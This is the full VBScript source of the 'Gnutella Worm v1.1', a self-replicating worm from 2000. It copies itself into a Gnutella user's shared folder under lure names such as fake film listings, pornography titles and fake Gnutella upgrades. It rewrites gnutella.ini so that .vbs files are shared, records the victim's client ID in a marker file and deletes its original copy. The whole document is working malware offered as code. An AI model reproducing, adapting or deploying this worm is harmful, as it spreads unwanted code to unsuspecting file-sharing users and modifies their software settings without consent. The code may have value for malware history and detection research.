Option Explicit
Dim CurrentFilename, CurrentGeneration, InfectionDate
CurrentFilename = "Battlefield Earth.vbs"
CurrentGeneration = 17
InfectionDate = "7/23/00, 10:45:59 PM"


'
const ProgramName = "Gnutella Worm v1.1"
const ProgramDate = "2000 May 21. I think that's the first Gnutella Worm."
'
'
' Watching CurrentGeneration will be quite interesting. I wonder if
' anyone ever studied this compared with real viral spreading.
'
' 42
'
' History
'
'  1.1  o Now copies itself to a list of target keyword instead of just current filename
'       o Fixed a but with Ini path... (1.0 didn't work at all. he he.)
'
'  1.0  o Initial Release
'

' Behavior Control Parameters
Dim NewFilenames, GnutellaPath, GnutellaIni, VictimFilename
NewFilenames    = Array(ProgramName & ".vbs", "Jenna Jameson movie listing.vbs", "Pamela Anderson movie listing.vbs", "Asia Carerra movie listing.vbs", "xxx FTP movie listing.vbs", "ASF Compressor (No quality loss).vbs", "collegesex.vbs", "Gladiator.vbs", "Battlefield Earth.vbs", "Evangelion complete episodes scripts.vbs", "Scan Master checklist.vbs", "How to eat pussy.vbs", "Alicia Silverstone.vbs", "Pearl Jam.vbs", "Mp3 compressor (Half the size but same quality).vbs", "Napster Metallica Crack.vbs", "Santana.vbs", "NSync.vbs", "Nirvana.mp3.vbs", "Shania Twain.mp3.vbs", "Jesus loves you.vbs", "Gnutella upgrade.vbs", "OFFICIAL Gnutella Option Pack.vbs")
GnutellaPath    = "C:\Program Files\gnutella\"
GnutellaIni     = GnutellaPath + "gnutella.ini"
VictimFilename  = "Yet another GWV! "                   ' (Gnutella Worm Victim :)


Const ForReading = 1
Const ForWriting = 2


Dim fso
Dim SourceFile, DestinationFile
Dim NewFilename
Dim VictimName

Function ModifyAndCopy
  ' Change Header data (New name, Generation number, any info passed down to the next Generation)

  DestinationFile.WriteLine(SourceFile.ReadLine)
  DestinationFile.WriteLine(SourceFile.ReadLine)

  DestinationFile.WriteLine("CurrentFilename = """ & NewFilename & """")

  DestinationFile.WriteLine("CurrentGeneration = " & (CurrentGeneration + 1))

  DestinationFile.WriteLine("InfectionDate = """ & Date & ", " & Time & """")

  SourceFile.ReadLine ' Skip the ones we just wrote changed.
  SourceFile.Readline
  SourceFile.Readline


  ' Copy the rest of the file as-is
  Do While Not SourceFile.AtEndOfStream
    DestinationFile.WriteLine(SourceFile.ReadLine)
  Loop
End Function

Function ProcessIni
  Dim IniFile, IniFileDest
  Dim Line

  Set IniFile = fso.OpenTextFile(GnutellaIni, ForReading)
  Set IniFileDest = fso.CreateTextFile(GnutellaIni + "_", ForWriting)

  Do While Not IniFile.AtEndOfStream
    Line = IniFile.ReadLine

    if Left(Line, 8) = "extlist=" Then
      IniFileDest.WriteLine(Line + ";vbs")
    ElseIf Left(Line, 13) = "databasepath=" Then
      IniFileDest.WriteLine(Line + ";" + GnutellaPath)
    ElseIf Left(Line, 12) = "clientid128=" Then
      VictimName = Mid(Line, 13)
      IniFileDest.WriteLine(Line)
    Else
      IniFileDest.WriteLine(Line)
    End If
  Loop

  IniFileDest.Close
  IniFile.Close

  fso.DeleteFile(GnutellaIni)
  fso.MoveFile GnutellaIni + "_", GnutellaIni

End Function

Function SignalVictim
  Dim Victim
  Dim Line
  Dim SignatureFilename
  
  SignatureFilename = GnutellaPath & VictimFilename & VictimName & ".zip"

  Set Victim = fso.CreateTextFile(SignatureFilename, ForWriting)

  Victim.WriteLine("Generation #: " & CurrentGeneration)
  Victim.WriteLine("Victim ID: " & VictimName)
  Victim.WriteLine("Infection date: " & InfectionDate)
  
  Victim.WriteLine("If I was a naughty boy, I could use scripting to get name, email, whatever file I want.")

  Victim.Close
End Function

Set fso = CreateObject("Scripting.FileSystemObject")


If fso.FolderExists(GnutellaPath) Then
  For Each NewFilename in NewFilenames

    Set DestinationFile = fso.CreateTextFile(GnutellaPath + NewFilename, True)
    Set SourceFile = fso.OpenTextFile(CurrentFilename, ForReading)

    ModifyAndCopy
    ProcessIni
    SignalVictim

    SourceFile.Close
    DestinationFile.Close
  Next

End If

fso.DeleteFile(CurrentFilename)

